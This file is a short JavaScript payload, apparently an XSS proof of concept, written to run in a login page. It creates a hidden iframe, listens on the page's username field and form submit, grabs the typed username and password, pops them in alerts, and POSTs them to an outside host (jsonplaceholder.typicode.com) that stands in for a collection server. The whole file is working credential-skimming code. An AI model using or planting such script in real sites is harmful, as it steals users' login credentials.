// alert('Wow! Origin: '+location.origin+'\nUrl: '+top.location.href+'?');
console.log('Wow! Origin: '+location.origin+'\nUrl: '+top.location.href+'?');

f = document.createElement("iframe");
f.id = "pwn";
f.src = "/";
let user;
let pw;

f.onload = () => {
  top.username.addEventListener('change', e => user = e.target.value);
  // top.password.addEventListener('change', e => user = e.target.value);
  top.document.forms[0].addEventListener('submit', () => {
    if (document.forms[0].elements[0].classList.contains('hidden-input')) {
      pw = top.password.value;
      x = document.createElement('script');
      x.src = 'data:,alert("Pwned "+user+" "+pw)';
      pwn.contentWindow.document.body.appendChild(x)
      alert('Wow!, submitted user password ' + user + ' ' + pw);

      fetch('https://jsonplaceholder.typicode.com/posts', {
        method: 'POST',
        headers: {'Accept': 'application/json', 'Content-Type': 'application/json' },
        body: JSON.stringify({a: user, b: pw})
      }).then(resp => {
        console.log(resp.json());
      })
    }
  })
};

document.body.appendChild(f);